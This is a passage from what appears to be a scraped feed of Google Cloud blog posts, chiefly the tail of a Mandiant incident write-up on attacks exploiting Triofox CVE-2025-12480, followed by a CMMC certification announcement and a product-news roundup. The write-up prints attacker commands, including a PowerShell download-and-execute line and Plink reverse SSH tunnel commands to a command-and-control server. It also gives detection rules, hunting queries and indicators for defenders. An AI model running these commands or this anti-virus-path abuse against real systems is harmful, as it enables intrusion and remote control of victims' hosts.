attacker.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">No Origin Validation - No check for whether the request came from an actual </span><code style=\"vertical-align: baseline;\">localhost</code><span style=\"vertical-align: baseline;\"> connection versus a spoofed header.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Configuration Dependence - If </span><code style=\"vertical-align: baseline;\">TrustedHostIP</code><span style=\"vertical-align: baseline;\"> isn't configured, the only protection is the Host header check.</span></p>\n</li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\">Triofox Anti-Virus Feature Abuse</span></h3>\n<p><span style=\"vertical-align: baseline;\">To achieve code execution, the attacker logged in using the newly created Admin account. The attacker uploaded malicious files to execute them using the built-in anti-virus feature. To set up the anti-virus feature, the user is allowed to provide an arbitrary path for the selected anti-virus. The file configured as the anti-virus scanner location inherits the Triofox parent process account privileges, running under the context of the SYSTEM account.</span></p>\n<p><span style=\"vertical-align: baseline;\">The attacker was able to run their malicious batch script by configuring the path of the anti-virus engine to point to their script. The folder path on disk of any shared folder is displayed when publishing a new share within the Triofox application. Then, by uploading an arbitrary file to any published share within the Triofox instance, the configured script will be executed.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Anti-virus engine path set to a malicious batch script\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/triofox-vulnerability-fig9.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 9: Anti-virus engine path set to a malicious batch script</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">SecOps telemetry recorded the following command-line execution of the attacker script:</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>C:\\Windows\\system32\\cmd.exe /c \"\"c:\\triofox\\centre_report.bat\" C:\\Windows\\TEMP\\eset_temp\\ESET638946159761752413.av\"</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Post-Exploitation Activity</span></h3></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Overview of the post-exploitation activity\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/original_images/triofox-vulnerability-fig10a.jpg\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 10: Overview of the post-exploitation activity</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Support Tools Deployment</span></h4>\n<p><span style=\"vertical-align: baseline;\">The attacker script </span><code style=\"vertical-align: baseline;\">centre_report.bat</code><span style=\"vertical-align: baseline;\"> executed the following PowerShell command to download and execute a second-stage payload:</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>powershell -NoProfile -ExecutionPolicy Bypass -Command \"$url = 'http://84.200.80[.]252/SAgentInstaller_16.7.10368.56560.zip'; $out = 'C:\\\\Windows\\appcompat\\SAgentInstaller_16.7.10368.56560.exe'; Invoke-WebRequest -Uri $url -OutFile $out; Start-Process $out -ArgumentList '/silent' -Wait\"</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The PowerShell downloader was designed to:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Download a payload from </span><code style=\"vertical-align: baseline;\">http://84.200.80[.]252/SAgentInstaller_16.7.10368.56560.zip</code><span style=\"vertical-align: baseline;\">, which hosted a disguised executable despite the ZIP extension</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Save the payload to: </span><code style=\"vertical-align: baseline;\">C:\\Windows\\appcompat\\SAgentInstaller_16.7.10368.56560.exe</code></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Execute the payload silently</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">The executed payload was a legitimate copy of the Zoho Unified Endpoint Management System (UEMS) software installer. The attacker used the UEMS agent to then deploy the Zoho Assist and Anydesk remote access utilities on the host.</span></p>\n<h4><span style=\"vertical-align: baseline;\">Reconnaissance and Privilege Escalation</span></h4>\n<p><span style=\"vertical-align: baseline;\">The attacker used Zoho Assist to run various commands to enumerate active SMB sessions and specific local and domain user information.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">Additionally, they attempted to change passwords for existing accounts and add the accounts to the local administrators and the \u201cDomain Admins\u201d group.</span></p>\n<h4><span style=\"vertical-align: baseline;\">Defense Evasion</span></h4>\n<p><span style=\"vertical-align: baseline;\">The attacker downloaded </span><code style=\"vertical-align: baseline;\">sihosts.exe</code><span style=\"vertical-align: baseline;\"> and </span><code style=\"vertical-align: baseline;\">silcon.exe</code><span style=\"vertical-align: baseline;\"> (sourced from the legitimate domain </span><code style=\"vertical-align: baseline;\">the.earth[.]li</code><span style=\"vertical-align: baseline;\">) into the directory </span><code style=\"vertical-align: baseline;\">C:\\windows\\temp\\</code><span style=\"vertical-align: baseline;\">.</span></p></div>\n<div class=\"block-paragraph_advanced\"><div align=\"center\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1px\" cellpadding=\"16px\" style=\"border-collapse: collapse; width: 100%;\"><colgroup><col /><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong style=\"vertical-align: baseline;\">Filename\u00a0</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong style=\"vertical-align: baseline;\">Original Filename</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong style=\"vertical-align: baseline;\">Description</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><span style=\"vertical-align: baseline;\">sihosts.exe</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><span style=\"vertical-align: baseline;\">Plink (PuTTY Link)</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">A common command-line utility for creating SSH connections</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><span style=\"vertical-align: baseline;\">silcon.exe</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><span style=\"vertical-align: baseline;\">PuTTY</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">A SSH and telnet client</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">These tools were used to set up an encrypted tunnel, connecting the compromised host to their command-and-control (C2 or C&amp;C) server over port </span><code style=\"vertical-align: baseline;\">433</code><span style=\"vertical-align: baseline;\"> via SSH. The C2 server could then forward all traffic over the tunnel to the compromised host on port 3389, allowing inbound RDP traffic. The commands were run with the following parameters:</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>C:\\windows\\temp\\sihosts.exe -batch -hostkey \"ssh-rsa 2048 SHA256:&lt;REDACTED&gt;\" -ssh -P 433 -l &lt;REDACTED&gt; -pw &lt;REDACTED&gt; -R 216.107.136[.]46:17400:127.0.0.1:3389 216.107.136[.]46\n\nC:\\windows\\temp\\silcon.exe  -ssh -P 433 -l &lt;REDACTED&gt; -pw &lt;REDACTED&gt;-R 216.107.136[.]46:17400:127.0.0.1:3389 216.107.136[.]46</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Conclusion</span></h3>\n<p><span style=\"vertical-align: baseline;\">While this vulnerability is patched in the Triofox version </span><code style=\"vertical-align: baseline;\">16.7.10368.56560</code><span style=\"vertical-align: baseline;\">, Mandiant recommends upgrading to the latest release. In addition, Mandiant recommends auditing admin accounts, and verifying that Triofox\u2019s Anti-virus Engine is not configured to execute unauthorized scripts or binaries. Security teams should also hunt for attacker tools using our hunting queries listed at the bottom of this post, and monitor for anomalous outbound SSH traffic.\u00a0</span></p>\n<h3><span style=\"vertical-align: baseline;\">Acknowledgements</span></h3>\n<p><span style=\"vertical-align: baseline;\">Special thanks to Elvis Miezitis, Chris Pickett, Moritz Raabe, Angelo Del Rosario, and Lampros Noutsos</span></p>\n<h3><span style=\"vertical-align: baseline;\">Detection Through Google SecOps</span></h3>\n<p><span style=\"vertical-align: baseline;\">Google SecOps customers have access to these broad category rules and more under the </span><code style=\"vertical-align: baseline;\">Mandiant Windows Threats</code>\u00a0<span style=\"vertical-align: baseline;\">rule pack. The activity discussed in the blog post is detected in Google SecOps under the rule names:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Gladinet or Triofox IIS Worker Spawns CMD</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Gladinet or Triofox Suspicious File or Directory Activity</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Gladinet Cloudmonitor Launches Suspicious Child Process</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Powershell Download and Execute</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">File Writes To AppCompat</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Suspicious Renamed Anydesk Install</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Suspicious Activity In Triofox Directory</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Suspicious Execution From Appcompat</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">RDP Protocol Over SSH Reverse Tunnel Methodology</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Plink EXE Tunneler</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Net User Domain Enumeration</span></p>\n</li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\">SecOps Hunting Queries</span></h3>\n<p><span style=\"vertical-align: baseline;\">The following UDM queries can be used to identify potential compromises within your environment.</span></p>\n<h4><span style=\"vertical-align: baseline;\">GladinetCloudMonitor.exe Spawns Windows Command Shell</span></h4>\n<p><span style=\"vertical-align: baseline;\">Identify the legitimate GladinetCloudMonitor.exe process spawning a Windows Command Shell.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>metadata.event_type = \"PROCESS_LAUNCH\"\nprincipal.process.file.full_path = /GladinetCloudMonitor\\.exe/ nocase\ntarget.process.file.full_path = /cmd\\.exe/ nocase</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Utility Execution</span></h4>\n<p><span style=\"vertical-align: baseline;\">Identify the execution of a renamed Plink executable (sihosts.exe) or a renamed PuTTy executable (silcon.exe) attempting to establish a reverse SSH tunnel.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>metadata.event_type = \"PROCESS_LAUNCH\"\ntarget.process.command_line = /-R\\b/\n(\ntarget.process.file.full_path = /(silcon\\.exe|sihosts\\.exe)/ nocase or\n(target.process.file.sha256 = \"50479953865b30775056441b10fdcb984126ba4f98af4f64756902a807b453e7\" and target.process.file.full_path != /plink\\.exe/ nocase) or\n(target.process.file.sha256 = \"16cbe40fb24ce2d422afddb5a90a5801ced32ef52c22c2fc77b25a90837f28ad\" and target.process.file.full_path != /putty\\.exe/ nocase)\n)</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Indicators of Compromise (IOCs)</span></h3>\n<p><span style=\"vertical-align: baseline;\">The following <a href=\"https://www.virustotal.com/gui/collection/24c5c9845cff98045866db50c979374b912c0466abcb2b9e20a166fa407eba04\" rel=\"noopener\" target=\"_blank\">IOCs are available in a Google Threat Intelligence (GTI) collection</a> for registered users.</span></p>\n<p><span style=\"vertical-align: baseline;\">Note: The following table contains artifacts that are renamed instances of legitimate tools.</span></p>\n<h4><span style=\"vertical-align: baseline;\">Host-Based Artifacts</span></h4></div>\n<div class=\"block-paragraph_advanced\"><div align=\"center\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Artifact</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Description</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">SHA-256 Hash</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">C:\\Windows\\appcompat\\SAgentInstaller_16.7.10368.56560.exe</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Installer containing Zoho UEMS Agent</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">43c455274d41e58132be7f66139566a941190ceba46082eb2ad7a6a261bfd63f</code></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">C:\\Windows\\temp\\sihosts.exe</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Plink</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">50479953865b30775056441b10fdcb984126ba4f98af4f64756902a807b453e7</code></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">C:\\Windows\\temp\\silcon.exe</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">PuTTy</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">16cbe40fb24ce2d422afddb5a90a5801ced32ef52c22c2fc77b25a90837f28ad</code></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">C:\\Windows\\temp\\file.exe</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">AnyDesk</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">ac7f226bdf1c6750afa6a03da2b483eee2ef02cd9c2d6af71ea7c6a9a4eace2f</code></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">C:\\triofox\\centre_report.bat</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Attacker batch script filename</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">N/A</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Network-Based Artifacts</span></h4></div>\n<div class=\"block-paragraph_advanced\"><div align=\"center\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">IP Address</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">ASN</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Description</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">85.239.63[.]37</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">AS62240 - Clouvider Limited</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">IP address of the attacker used to initially exploit CVE-2025-12480 to create the admin account and gain access to the Triofox instance</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">65.109.204[.]197</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">AS24950 - Hetzner Online GmbH</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">After a dormant period, the threat actor used this IP address to login back into the Triofox instance and carry out subsequent activities</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">84.200.80[.]252</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">AS214036 - Ultahost, Inc.</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">IP address hosting the installer for the Zoho UEMSAgent remote access tool</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">216.107.136[.]46</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">AS396356 - LATITUDE-SH</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Plink C2</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>",
        "published_date": "2025-11-10 14:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/public-sector/securing-the-mission-google-public-sectors-cmmc-level-2-certification-and-commitment-to-national-security/",
        "title": "Securing the mission: Google Public Sector\u2019s CMMC Level 2 certification and commitment to national security",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/PS_Copy_of_Blog_Headers_-_Cloudstyle_3.0_18.max-600x600.png",
        "author": "Ron Bushar",
        "track": null,
        "description": "<div class=\"block-paragraph\"><p>Google Public Sector is committed to supporting the critical missions of the U.S. Department of Defense (DoD) by delivering cutting-edge cloud, AI, and data services securely. Today, we are marking an important milestone in that commitment: we have successfully achieved Cybersecurity Maturity Model Certification (CMMC) Level 2 certification under the DoD\u2019s CMMC program.</p><p>This certification, validated by a certified third-party assessment organization (C3PAO), affirms that Google Public Sector\u2019s internal systems used to handle Controlled Unclassified Information (CUI) meet the DoD\u2019s rigorous cybersecurity standards for protecting CUI.</p><h3><b>Enabling a secure partnership</b></h3><p>This CMMC Level 2 certification is a key enabler for our partnership with the DoD. It ensures our teams can operate and collaborate within the defense ecosystem fully supporting the new DoD requirements, allowing us to serve as a trusted partner and support the mission without compromise.</p><h3><b>Helping the Defense Industrial Base on their CMMC journey</b></h3><p>While this certification does not extend to customer environments, we are also dedicated to helping our partners and customers across the Defense Industrial Base (DIB) on their <i>own</i> CMMC journeys.</p><p>Our FedRAMP-authorized cloud services, including Google Workspace, are designed to support DIB suppliers in building their CMMC-compliant solutions with secure, cutting-edge cloud, AI, and data capabilities. You can find all of our compliance resources, including guides for both Google Cloud and Google Workspace, on our central<a href=\"https://cloud.google.com/security/compliance/cmmc\"> CMMC compliance page</a>. As an example, our<a href=\"https://services.google.com/fh/files/helpcenter/gws_implementation_guide_for_cmmc.pdf\" target=\"_blank\"> Google Workspace CMMC Implementation Guide</a> provides specific configuration details and control mappings and our recent blog details how <a href=\"https://workspace.google.com/blog/identity-and-security/checkboxes-checkmates-how-google-workspace-can-help-you-achieve-cmmc-20-compliance?e=48754805\" target=\"_blank\">Google Workspace can help you achieve CMMC 2.0 compliance</a>. These resources are designed to help DIB companies accelerate their own assessments and build their CMMC-compliant solutions on a secure, verified foundation.</p><h3><b>Understanding CMMC and the DFARS connection</b></h3><p>The CMMC program is a DoD initiative to enhance cybersecurity across the DIB. Its purpose is to verify that contractors have implemented the required security controls, based heavily on NIST Special Publication (SP) 800-171, to protect CUI and Federal Contract Information (FCI).</p><p>Many contractors are already familiar with DFARS 252.204-7012, which has long required the implementation of NIST SP 800-171. The new CMMC program is being implemented into contracts via the clause DFARS 252.204-7021. When this clause appears in a solicitation, it makes having achieved a specific CMMC level a mandatory condition for contract award.</p><h3><b>A continued commitment to the mission</b></h3><p>Our CMMC Level 2 certification is a direct reflection of our commitment to meeting the DoD's stringent security requirements. It ensures we can continue to support the Department\u2019s mission responsibly and compliantly. We remain committed to our partnership with the DoD, empowering the Defense Industrial Base with cutting-edge cloud, AI, and data services to build a more secure and resilient future.</p><p>Catch the highlights from our recent <a href=\"https://cloudonair.withgoogle.com/events/public-sector-summit-2025\" target=\"_blank\">Google Public Sector Summit</a> where we shared how Google Cloud\u2019s AI and security technologies can help advance your mission.</p></div>",
        "published_date": "2025-11-10 13:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/inside-google-cloud/whats-new-google-cloud/",
        "title": "What\u2019s new with Google Cloud",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/original_images/whts_new_2025_5V6FQkI.jpg",
        "author": "Google Cloud Content & Editorial",
        "track": null,
        "description": "<div class=\"block-paragraph\"><p>Want to know the latest from Google Cloud? Find it here in one handy location. Check back regularly for our newest updates, announcements, resources, events, learning opportunities, and more.\u00a0</p><hr /><p><b>Tip</b>:\u00a0Not sure where to find what you\u2019re looking for on the Google Cloud blog? Start here:\u00a0<a href=\"https://cloud.google.com/blog/topics/inside-google-cloud/complete-list-google-cloud-blog-links-2021\">Google Cloud blog 101: Full list of topics, links, and resources</a>.</p><hr /><p></p></div>\n<div class=\"block-paragraph_advanced\"><h3>Nov 3 - Nov 7</h3>\n<ul>\n<li><strong>Announcing the Data Engineering Agent<br /></strong>Data teams can now automate complex SQL pipeline tasks with the new Data Engineering Agent for BigQuery, available in Preview. This agent simplifies development, maintenance, and troubleshooting, allowing engineers to focus on strategic initiatives. It supports natural language pipeline creation, intelligent modification, and seamless migration from legacy tools.<br /><br /><a href=\"https://cloud.google.com/blog/products/data-analytics/exploring-the-data-engineering-agent-in-bigquery\" rel=\"noopener\" target=\"_blank\">Transform your data engineering workflows today!</a></li>\n<li><strong>From Threat Model to TTX: Bringing a New Design Partner to the Table<br /></strong>Gain an overview of threat modeling, how threat models can be performed rapidly, and why threat model scenarios make excellent tabletop scenarios - especially for products that are still in development.<br /><br />To get more information about threat modeling or tabletop exercises, check out <a href=\"https://cloud.google.com/security/resources/defenders-advantage?e=48754805\" rel=\"noopener\" target=\"_blank\">The Defender\u2019s Advantage</a> or reach out to a <a href=\"https://www.mandiant.com/contact-us\" rel=\"noopener\" target=\"_blank\">Mandiant cybersecurity expert</a> for specialized assistance.</li>\n<li><strong>Application Monitoring now includes a Topology.<br /></strong>Application Monitoring now includes a graphical representation of runtime dependencies (i.e Topology) for your App Hub defined application. This now allows you to quickly understand your app architecture, spot anomalous runtime interactions and resolve issues flagged from alerts quicker. Runtime dependencies are extracted from the OpenTelemetry traces you send to Cloud Trace from your App Hub registered workload.<br /><br />Follow the outline <a href=\"https://docs.cloud.google.com/app-hub/docs/set-up-app-hub\" rel=\"noopener\" target=\"_blank\">here</a> to register your app and unlock the benefits of Application Monitoring and <a href=\"https://cloud.google.com/monitoring/docs/application-topology\" rel=\"noopener\" target=\"_blank\">its newly launched Topology</a></li>\n<li><strong>Supercharge AI Agents: Apply Enterprise Governance to GenAI Workflows with Apigee<br /></strong>As Generative AI agents move to production, you need control over cost, reliability, and security. A powerful new pattern introduces Apigee as the unified AI Agent Gateway for Large Language Model (LLM) calls. Route agent traffic through Apigee to gain immediate enterprise-grade governance, including dynamic circuit breaking, token consumption quotas, and sensitive data masking. A new Apigee wrapper for the Agent Development Kit (ADK) simplifies implementation. Turn your agents into manageable, secure AI products.<br /><br /><a href=\"https://discuss.google.dev/t/supercharge-your-ai-agents-applying-enterprise-governance-to-genai/284164\" rel=\"noopener\" target=\"_blank\">Read</a> the full article and explore the new pattern.</li>\n</ul>\n<h3>Oct 20 - Oct 24</h3>\n<ul>\n<li><strong>Dataframe visualization in Colab Enterprise.</strong> Use <a href=\"https://cloud.google.com/colab/docs/visualization-cells\" rel=\"noopener\" target=\"_blank\">visualization cells</a> to create custom, stylized visualizations of your DataFrames: no coding required! Choose your fields, chart type, aggregation, and color scheme, then see a visualization of your data without leaving your notebook. Check out the <a href=\"https://cloud.google.com/bigquery/docs/visualize-data-colab\" rel=\"noopener\" target=\"_blank\">tutorial</a> and get started with data visualization today.</li>\n</ul>\n<h3>Oct 13 - Oct 17</h3>\n<ul>\n<li><strong>Build Serverless AI in the Cloud Run Hackathon</strong><br />Ready to go from idea to global scale in minutes? The Cloud Run Hackathon is here! Build serverless AI apps with AI Studio, orchestrate intelligent agents, or harness the power of GPUs. Compete for a share of $50,000+ in prizes!\n<ul>\n<li>Submissions are open from Oct 6, 2025 to Nov 10, 2025.</li>\n<li>Learn more and register: run.devpost.com</li>\n</ul>\n</li>\n</ul>\n<h3>Oct 6 - Oct 10</h3>\n<ul>\n<li>Multi-agent AI systems help you optimize complex and dynamic processes by segmenting them into discrete tasks that multiple specialized AI agents collaboratively execute. To get started with building secure and reliable 